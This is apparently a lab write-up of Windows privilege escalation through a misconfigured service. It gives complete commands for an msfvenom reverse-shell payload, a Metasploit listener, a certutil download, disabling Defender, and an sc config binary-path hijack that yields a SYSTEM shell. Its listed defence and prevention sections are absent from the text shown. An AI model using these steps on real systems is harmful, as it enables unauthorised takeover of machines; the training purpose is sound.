# Insecure Service Configuration

**Date:** June 2026<br>
**Author:** ShahinSecLab<br>
**Category:** Privilege Escalation<br>
**Difficulty:** Easy<br>
**Tools:** msfvenom, Metasploit, winPEAS, accesschk.exe, certutil

## Table of Contents

- [Introduction](#Introduction)
- [Why this attack works](#why-this-attack-works)
- [Attack flow](#attack-flow)
- [What I needed before starting](#what-i-needed-before-starting)
- [What I understood during the process](#what-i-understood-during-the-process)

- [Step 1 — Generating a Malicious Payload with msfvenom](#step-1--generating-a-malicious-payload-with-msfvenom)
- [Step 2 — Setting Up Metasploit Listener and HTTP Server](#step-2--setting-up-metasploit-listener-and-http-server)
- [Step 3 — Downloading the Payload on the Victim Machine](#step-3--downloading-the-payload-on-the-victim-machine)
- [Step 4 — Transferring the Payload to PrivEsc Folder](#step-4--transferring-the-payload-to-privesc-folder)
- [Step 5 — Running the Payload and Getting a Meterpreter Shell](#step-5--running-the-payload-and-getting-a-meterpreter-shell)
- [Step 6 — Enumerating the Victim and Uploading winPEAS](#step-6--enumerating-the-victim-and-uploading-winpeas)
- [Step 7 — Running winPEAS to Find Privilege Escalation Paths](#step-7--running-winpeas-to-find-privilege-escalation-paths)
- [Step 8 — Verifying Service Permissions with accesschk.exe](#step-8--verifying-service-permissions-with-accesschkexe)
- [Step 9 — Checking the Service Configuration](#step-9--checking-the-service-configuration)
- [Step 10 — Generating a New Payload and Starting a Second Listener](#step-10--generating-a-new-payload-and-starting-a-second-listener)
- [Step 11 — Uploading the New Payload and Changing the Service Binary Path](#step-11--uploading-the-new-payload-and-changing-the-service-binary-path)
- [Step 12 — Starting the Service and Getting a SYSTEM Shell](#step-12--starting-the-service-and-getting-a-system-shell)

- [How Defenders Can Catch This](#how-defenders-can-catch-this)
- [How to Prevent It](#how-to-prevent-it)
- [What I Achieved](#what-i-achieved)

## Introduction

Insecure Service Configuration is a local privilege escalation technique. When a Windows service is set up with weak permissions, a low privilege user can modify how that service runs. If the service runs as SYSTEM, I can abuse those weak permissions to run my own code as SYSTEM and take full control of the machine — without any exploit or CVE.

## Why This Attack Works

Windows services often run as SYSTEM — the highest privilege account on the machine. If the service permissions are weak enough for a normal user to modify, I can change the binary path to point to my own malicious executable. When the service restarts, it runs my payload as SYSTEM.

## Attack Flow

```
Generated malicious payload (reverse.exe) on Kali with msfvenom
                              ↓
Started Metasploit listener on port 4444
                              ↓
Hosted payload over HTTP with Python HTTP server
                              ↓
Downloaded reverse.exe on victim machine via browser
                              ↓
Transferred payload to C:\PrivEsc using certutil
                              ↓
Ran reverse.exe on victim machine
                              ↓
Got Meterpreter shell on Kali as low privilege user (MSEDGEWIN10\user)
                              ↓
Uploaded winPEAS and ran it to find privilege escalation paths
                              ↓
winPEAS flagged daclsvc service as vulnerable
                              ↓
Verified with accesschk.exe — found SERVICE_CHANGE_CONFIG permission
                              ↓
Checked service config — daclsvc runs as LocalSystem (SYSTEM)
                              ↓
Generated second payload (privesc.exe) on port 9001
                              ↓
Uploaded privesc.exe to C:\PrivEsc on victim
                              ↓
Changed daclsvc binary path to C:\PrivEsc\privesc.exe
                              ↓
Started daclsvc service
                              ↓
Metasploit caught SYSTEM shell on port 9001
                              ↓
whoami → nt authority\system
```

## Step 1 — Generating a Malicious Payload with msfvenom

I used revshells.com to build the msfvenom command, then ran it on my Kali machine to generate a malicious executable.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o reverse.exe
```

### Flag Breakdown

- `-p windows/x64/meterpreter/reverse_tcp`: Generates a 64-bit Windows Meterpreter reverse TCP payload.
- `LHOST=192.168.5.128`: The IP address of my Kali machine that receives the reverse connection.
- `LPORT=4444`: The port on my Kali machine that listens for the incoming Meterpreter session.
- `-f exe`: Generates the payload as a Windows executable (.exe).
- `-o reverse.exe`: Saves the generated payload as reverse.exe.

**Output:**

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step1-1.png" width="600">
</p>

## Step 2 — Setting Up Metasploit Listener and HTTP Server

I opened two terminals on Kali — one for the Metasploit listener and one to host the payload over HTTP.

Terminal 1 — Metasploit Listener

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.5.128
set lport 4444
run
```
**Output:**

```text
[*] Started reverse TCP handler on 192.168.5.128:4444
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step2-1.png" width="600">
</p>

Terminal 2 — Python HTTP Server

```bash
python3 -m http.server 80
```

**Output:**

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step2-2.png" width="600">
</p>

## Step 3 — Downloading the Payload on the Victim Machine

I switched to the Windows 10 victim machine and opened Microsoft Edge. I browsed to my Kali HTTP server:

```bash
http://192.168.5.128/
```
I clicked reverse.exe to download it. Windows Defender blocked it at first — showing "Couldn't download - Virus detected". I turned off Real Time Protection and Threat Protection in Windows Defender settings, then the download went through successfully.

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step3-1.png" width="600">
</p>

## Step 4 — Transferring the Payload to PrivEsc Folder

I opened CMD from C:\PrivEsc and used certutil to download reverse.exe from my Kali HTTP server:

```bash
certutil -urlcache -split -f http://192.168.5.128/reverse.exe reverse.exe
```
### Flag Breakdown

- `-urlcache` : Uses URL cache to download a file
- `-split` : Splits the download into blocks
- `-f` : Forces overwrite if file already exists

**Output:**

```text
CertUtil: -URLCache command completed successfully.
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step4-1.png" width="600">
</p>

## Step 5 — Running the Payload and Getting a Meterpreter Shell

On the Victim Machine

```bash
C:\PrivEsc> reverse.exe
```
Metasploit Caught the Connection on Kali

```text
[*] Sending stage (244806 bytes) to 192.168.5.129
[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.129:49985) at 2026-06-18 00:01:24 -0400

meterpreter >
```

- Attacker IP : 192.168.5.128
- Victim IP : 192.168.5.129
- Port : 4444
- Session : Meterpreter session 1 opened

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step5-1.png" width="600">
</p>

## Step 6 — Enumerating the Victim and Uploading winPEAS

Checked System Info and Current User

```bash
meterpreter > sysinfo
```

**Output:**

```text
Computer        : MSEDGEWIN10
OS              : Windows 10 1809 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

```bash
meterpreter > getuid
```
```text
Server username: MSEDGEWIN10\user
```
I was a normal low privilege user. I needed to get to SYSTEM.

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step6-1.png" width="600">
</p>

Uploaded winPEAS

```bash
meterpreter > upload /home/kali/Desktop/tools/winPEASany.exe
```

```text
[*] Uploading  : /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
[*] Uploaded 224.00 KiB of 224.00 KiB (100.0%): /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
[*] Completed  : /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
```
<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step6-2.png" width="600">
</p>

## Step 7 — Running winPEAS to Find Privilege Escalation Paths

```bash
meterpreter > shell
```
```cmd
C:\PrivEsc> .\winPEASany.exe
```

winPEAS ran a full scan of the machine and flagged the `daclsvc` service as having weak permissions. That was my target.

## Step 8 — Verifying Service Permissions with accesschk.exe

Uploaded `accesschk.exe`

```bash
meterpreter > upload /home/kali/Desktop/tools/accesschk.exe
```

```text
[*] Uploading  : /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
[*] Uploaded 217.38 KiB of 217.38 KiB (100.0%): /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
[*] Completed  : /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
```

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step8-1.png" width="600">
</p>

Checked Service Permissions

```bash
C:\PrivEsc> .\accesschk.exe /accepteula -uwcqv user daclsvc
```
**Output:**

```
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

- `RW daclsvcI` : have read and write access to this service
- `SERVICE_CHANGE_CONFIGI` : can change the service binary path
- `SERVICE_START` : I can start the service
- `SERVICE_STOP` : I can stop the service

`SERVICE_CHANGE_CONFIG` was the key. It meant I could swap the binary path to my own payload.

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step8-2.png" width="600">
</p>

## Step 9 — Checking the Service Configuration

```bash
C:\PrivEsc> sc qc daclsvc
```
**Output:**

```
SERVICE_NAME: daclsvc
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        SERVICE_START_NAME : LocalSystem
```

```
|------Field--------|-----------------------Value-------------------|---------------Meaning--------|
|BINARY_PATH_NAME   |C:\Program Files\DACL Service\daclservice.exe  |Real service binary location  |
|SERVICE_START_NAME |LocalSystem                                    |Runs as SYSTEM                |
```

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step9-1.png" width="600">
</p>

## Step 10 — Generating a New Payload and Starting a Second Listener

I needed a second payload on a different port to catch the SYSTEM shell.
Generated New Payload on Kali

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=9001 -f exe -o privesc.exe
```
**Output:**

```
Final size of exe file: 7680 bytes
Saved as: privesc.exe
```

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step10-1.png" width="600">
</p>

Started Second Metasploit Listener on Port 9001

```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.5.128
set lport 9001
run
```
**Output:**
```
[*] Started reverse TCP handler on 192.168.5.128:9001
```

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step10-2.png" width="600">
</p>

## Step 11 — Uploading the New Payload and Changing the Service Binary Path

Uploaded privesc.exe

```bash
meterpreter > upload /home/kali/Desktop/privesc.exe
```

**Output:**

```
[*] Uploading  : /home/kali/Desktop/tools/privesc.exe -> privesc.exe
[*] Uploaded 7.50 KiB of 7.50 KiB (100.0%): /home/kali/Desktop/tools/privesc.exe -> privesc.exe
[*] Completed  : /home/kali/Desktop/tools/privesc.exe -> privesc.exe
```

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step11-1.png" width="600">
</p>

Changed the Service Binary Path

```bash
C:\PrivEsc> sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
```

**Output:**

```
sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
[SC] ChangeServiceConfig SUCCESS
```

```
|------Field--------|-----------------------Before-------------------|---------------After--------|
|BINARY_PATH_NAME   |C:\Program Files\DACL Service\daclservice.exe   |C:\PrivEsc\privesc.exe      |
```

<p align="center">
  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step11-2.png" width="600">
</p>

## Step 12 — Starting the Service and Getting a SYSTEM Shell

Started the Service

```bash
C:\PrivEsc> net start daclsvc
```

Metasploit Caught the SYSTEM Shell

```
[*] Meterpreter session 1 opened (192.168.5.128:9001 -> 192.168.5.129:60971) at 2026-06-18 08:03:48 -0400
```

```bash
meterpreter > shell
```
```bash
C:\Windows\system32>whoami
nt authority\system
```

- Attacker IP: `192.168.5.128`
- Victim IP: `192.168.5.129`
- Port: `9001`
- Privilege: `nt authority\system`

I went from a normal low privilege user account all the way to nt authority\system just by changing the binary path of a misconfigured service.